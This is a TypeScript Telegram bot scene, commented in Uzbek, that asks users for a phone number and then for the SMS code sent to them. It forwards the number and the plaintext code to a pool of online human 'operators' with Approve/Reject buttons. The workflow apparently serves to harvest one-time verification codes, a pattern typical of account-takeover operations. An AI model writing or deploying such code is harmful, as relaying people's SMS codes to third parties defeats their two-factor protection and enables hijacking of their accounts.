import { Scenes, Markup } from "telegraf";
import { api } from "../api";
import { BotContext } from "../../types";
import { onlineOperators } from "../realtime"; // ✅ qo‘shildi

interface SubmitState extends Scenes.WizardSessionData {
  phone?: string;
  submissionId?: number;
}

export const submitScene = new Scenes.WizardScene<BotContext>(
  "submit-scene",

  // 1️⃣ STEP — Telefon
  async (ctx) => {
    await ctx.reply("📱 Telefon raqam kiriting:");
    return ctx.wizard.next();
  },

  // 2️⃣ STEP — Telefon backend + OPERATOR PUSH
  async (ctx) => {
    const phone = (ctx.message as any)?.text;

    try {
      const { data } = await api.post(
        "/submission",
        { phone },
        {
          headers: {
            Authorization: `Bearer ${ctx.session.token}`,
          },
        }
      );

      (ctx.wizard.state as SubmitState).phone = phone;
      (ctx.wizard.state as SubmitState).submissionId = data.id;

      // ✅ REALTIME PUSH — telefon keldi
      for (const telegramId of onlineOperators.values()) {
        await ctx.telegram.sendMessage(
          telegramId,
          `📞 Yangi telefon:\n${phone}\n⏳ SMS kutilmoqda`
        );
      }

      await ctx.reply("📨 SMS yuborildi. Kodni kiriting:");
      return ctx.wizard.next();

    } catch (err: any) {
      console.log("ERROR:", err.response?.data);
      await ctx.reply("❌ Telefon yuborishda xatolik");
      return ctx.scene.leave();
    }
  },

  // 3️⃣ STEP — SMS kod + OPERATOR PUSH (button bilan)
  async (ctx) => {
    const smsCode = (ctx.message as any)?.text;
    const submissionId = (ctx.wizard.state as SubmitState).submissionId;
    const phone = (ctx.wizard.state as SubmitState).phone;

    try {
      await api.patch(
        `/submission/${submissionId}/sms`,
        { smsCode },
        {
          headers: {
            Authorization: `Bearer ${ctx.session.token}`,
          },
        }
      );

      // ✅ REALTIME PUSH — SMS keldi (Approve/Reject bilan)
      for (const telegramId of onlineOperators.values()) {
        await ctx.telegram.sendMessage(
          telegramId,
          `📞 ${phone}\n🔐 ${smsCode}`,
          Markup.inlineKeyboard([
            [
              Markup.button.callback("✅ Approve", `approve_${submissionId}`),
              Markup.button.callback("❌ Reject", `reject_${submissionId}`),
            ],
          ])
        );
      }

      await ctx.reply("⏳ SMS kod yuborildi. Tekshirilmoqda...");

    } catch (err: any) {
      console.log("ERROR:", err.response?.data);
      await ctx.reply("❌ SMS yuborishda xatolik");
    }

    return ctx.scene.leave();
  }
);